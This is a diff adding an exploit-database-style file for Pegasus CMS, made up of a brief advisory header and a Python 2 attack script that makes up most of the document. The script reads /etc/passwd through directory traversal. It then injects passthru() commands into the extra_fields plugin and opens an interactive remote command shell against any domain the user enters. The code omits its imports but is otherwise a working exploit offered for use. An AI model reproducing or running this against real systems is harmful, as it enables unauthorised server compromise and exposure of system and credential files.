@@ -1,0 +1,107 @@
+# Exploit Title: Pegasus extra_fields.php Plugin Remote Code Execution
+# Date: 14 March 2019
+# Exploit Author: R3zk0n
+# Vendor Homepage: https://www.wisdom.com.au/web/pegasus-cms
+# Software Link: N/A
+# Version: 1.0
+# Tested on: Linux
+# CVE : N/A
+
+The Pegasus CMS is vulnerable to directory travaseral and Remote code execution due to the way the extra_fields.php plugin functions. 
+
+The Plugin can be exploited using the safer eval trick linked below http://justanotherhacker.com/2016/04/analysis_of_the_safer_eval_rce_aka__the_wahckon_bug.html to obtain remote code execution
+
+Exploit attached below:
+
+#Eval is secure.. not really.
+# These Greetz to people who are smart, Wireghoul, Nano, Silverly, m3mantra, and leostat. and z3al
+requests.packages.urllib3.disable_warnings()
+banner = '''
+Welcome to the DANGER ZONE.
+                                  ;;J,ss,g,;
+                          ,s#@##"""77"^""77""@@Mw,
+                      ,#@#C7:             ,,     *^*@@@w
+                   ;@#7.             ;#@#.     ]ssmMMm#@@@m,
+                ,##\`        ,<   ,@@@@Q ,,#@#*7` ;s@@@@@@@@@Q
+              ;@#`         ]@C  ;@@@@@@@@@@"\  ;@@@@@@@@@@@@@@@m
+             @#\          #@@w#@@@@@@@@@@#~   @@@#M5"7j5#@@@@@@@@Q
+           ;@C           @@@@@@@@@@@@@@#\    @#\,           *77@@@k
+          ##.           #@@@@@@@@@@@@@#     '*                  {@@@
+         @#`          a@@@@@@@@@@@@@@L                           *%@@
+        {@*        ]@@@@@@@@@@@@@@#C*                              "@@
+       .@b;,s#@@@@@@@#@@#@@@@@@#C*                   ;s#@@@@@@m,    j@b
+       @@@#@@@@@@@@@@@@@@@@@@#C    =*        ,ppJJs#@@@@@@@@@@@@@k   @@
+       @#1@@@@@@@@@@@@@@@@#W~             ;@QQ@@@@@@@@@#` `|7@@@@~ ]@p
+       @[ @@5"@@@@@@@@@@#~            s@@@@@####@@@@@#\         @@@b ]@b
+       @[  @   j@@@@@@@@~]#"7        "@@#"\      7@@C           @@@b ]@b
+       @@       @@@@@@@@@@c           ^@@         ]@          ,@@@#  @@b
+       @@~  @   @@@@@@@@@@@b                      @#        a@@@@"  ]@@
+       j@Q  @@@@@@@@@@@@@@@@o        ,J          ]\      s@@@@#"`  ]@@L
+        ]@b ]@@@@@@@@@@@@@@@@o     ,@@@@>             ;@@@@@#^    #@@#
+         @@Q """%*577"%@@@@@@#   ]@@@@@C            ;@@@@#C     ;@@@#*
+          %@m          @@@@@@@  .@@@@@#            {@@@@@>    s@@@@#*
+           7@@        @@M@@@@@k ^@@@"#             @@@@@@@@@@@@@@@#
+            *@@m     @@bj@@@b@@@o|"^]#              %@@@@@@#M7@@#^
+              7@@m   "#  @@# @@7@@@@@@~               ^||:`,#@#C
+                ^%@@m j   @b j# \@@@@@@                 ,#@@#
+                  `7@@@mJ  7  '  |%@@@@@m,     -g,ss#@@@@#C
+                     `7%@@@Mm,     `7"%####@@MMMM#@@@#M7.
+                          ^7@@@@@@@@@@@@@@@@@@@@#MT^:
+                                `~^"7""""7^\*:
+Chimeria Exploit.
+pegausCMS Exploit's.
+'''
+
+
+print banner
+
+
+raw_url = raw_input("Please enter a domain name: \n")
+
+
+def dir_Trav(raw_url):
+    print "Checking for directory travseral..\n"
+    dir_list = requests.get("https://www."+ raw_url + "/file/includes/template/inc/test.cgi?&filename=/../../../../../../../../etc/passwd", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Connection": "close", "Cache-Control": "max-age=0"})
+    print dir_list.content
+    return
+print "Trying to execute directory travseral"
+dir_Trav(raw_url)
+r = requests.get("http://" + raw_url)
+print "Checking Status code: %s" % r.status_code
+if r.status_code == 200:
+    print "Connected"
+    print "Checking is using vulnerable CMS."
+    vuln = "http://" + raw_url + "/file/includes/plugins/globalFields/submit.php"
+    b = requests.get("http://" + raw_url + "/file/includes/plugins/globalFields/submit.php")
+    print "Checking CMS Status: %s " % b.status_code
+    if b.status_code == 200:
+        print "Seems exploitable.. Lets try to list the files!"
+
+
+
+        print raw_url
+        list_files = requests.post("http://www."+ raw_url +"/file/includes/plugins/extra_fields/submit.php", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}, data={"action": "passthru(\"ls -lah\");exit;phpinfo"})
+        print list_files.content
+        status = list_files.status_code
+        while status == 200:
+            try:
+                ShellCheck = raw_input("Shell>").strip()
+
+                Shell = requests.post("http://www."+ raw_url +"/file/includes/plugins/extra_fields/submit.php", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}, data={"action": "passthru(\"{}\");exit;phpinfo".format(ShellCheck)})
+
+                print Shell.content
+                if ShellCheck == "exit":
+                    sys.exit(0)
+            except KeyboardInterrupt:
+                print "Your exited bye"
+                sys.exit(0)
+
+    else:
+        print "Connected but does not seem exploitable. \n"
+        print "Bye!!!!!!!!!! \n"
+
+
+
+
+else:
+    print "Not connected"
